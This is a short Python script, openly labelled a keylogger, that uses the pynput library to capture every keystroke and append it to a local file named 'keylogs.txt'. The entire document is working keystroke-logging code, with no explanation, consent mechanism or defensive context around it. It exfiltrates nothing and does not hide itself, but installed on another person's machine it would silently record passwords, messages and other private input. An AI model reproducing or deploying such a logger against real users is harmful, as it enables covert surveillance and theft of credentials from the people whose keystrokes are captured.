
from pynput import keyboard

filename = "keylogs.txt"

def on_press(key):
    try:
        char = key.char
    except AttributeError:
        char = str(key)
    
    with open(filename, 'a') as logs:
        logs.write(char + '\n')

print("Keylogger started...")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()